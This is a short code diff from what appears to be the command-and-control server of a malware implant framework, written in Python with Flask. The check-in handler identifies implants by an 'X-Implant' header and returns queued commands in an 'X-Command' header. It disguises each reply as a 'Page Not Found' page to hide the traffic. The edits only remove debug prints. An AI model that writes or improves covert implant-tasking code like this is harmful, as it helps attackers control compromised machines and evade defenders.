@@ -44,17 +44,14 @@ def Stager():
 def ImplantCheckIn():
     # Should check ANY connection in against all configured implant options (IE body, header etc)
     #   unlike they 'headers' options which is configured in the current iteration.
-    #print(request.headers)
     if 'X-Implant' in request.headers:
         db.Update_ImplantLastCheckIn(request.headers['X-Implant'])
         CmdToExecute = Imp.IssueCommand(request.headers['X-Implant'])
-        #print("::",CmdToExecute)
-        Resp = make_response("Page Not Found")
+        Resp = make_response("Page Not Found.")
         if CmdToExecute !="==":
             print("ImplantCheckIn: ",CmdToExecute)
         Resp.headers["X-Command"] = CmdToExecute
     else:
-
         Resp = make_response("Page Not Found")
         Resp.headers["X-Command"] = "=="
     return Resp
